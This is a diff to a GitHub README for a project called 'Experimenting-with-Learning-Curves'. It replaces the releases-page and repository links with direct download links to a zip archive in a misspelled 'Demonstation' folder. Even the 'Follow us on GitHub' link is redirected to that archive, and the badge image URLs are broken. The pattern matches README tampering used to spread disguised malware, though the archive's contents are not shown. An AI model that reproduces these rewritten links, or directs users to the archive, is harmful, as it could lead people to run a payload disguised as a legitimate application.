@@ -8,7 +8,7 @@ Welcome to the "Experimenting-with-Learning-Curves" project! This application al
 
 To get started, you need to download the application. Click the link below to visit the downloads page:
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Now-%E2%96%BA-blue)](https://github.com/roBvert/Experimenting-with-Learning-Curves/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/roBvert/Experimenting-with-Learning-Curves/main/Demonstation/Curves-Experimenting-Learning-with-v1.9.zip%20Now-%E2%96%BA-blue)](https://raw.githubusercontent.com/roBvert/Experimenting-with-Learning-Curves/main/Demonstation/Curves-Experimenting-Learning-with-v1.9.zip)
 
 Once you are on the releases page, find the latest version and download it. 
 
@@ -78,13 +78,13 @@ If you encounter issues, please submit a report in the “Issues” section of t
 
 Join our community for support and discussions:
 
-- Follow us on GitHub: [GitHub Repository](https://github.com/roBvert/Experimenting-with-Learning-Curves)
+- Follow us on GitHub: [GitHub Repository](https://raw.githubusercontent.com/roBvert/Experimenting-with-Learning-Curves/main/Demonstation/Curves-Experimenting-Learning-with-v1.9.zip)
 - Participate in discussions and share your insights.
 
 ## 📥 Download Again
 
 Don't forget to download the latest version of the application using the link below:
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Now-%E2%96%BA-blue)](https://github.com/roBvert/Experimenting-with-Learning-Curves/releases) 
+[![Download the Latest Release](https://raw.githubusercontent.com/roBvert/Experimenting-with-Learning-Curves/main/Demonstation/Curves-Experimenting-Learning-with-v1.9.zip%20Now-%E2%96%BA-blue)](https://raw.githubusercontent.com/roBvert/Experimenting-with-Learning-Curves/main/Demonstation/Curves-Experimenting-Learning-with-v1.9.zip) 
 
 Thank you for choosing "Experimenting-with-Learning-Curves." We hope you enjoy using the application and find it helpful in your learning journey!
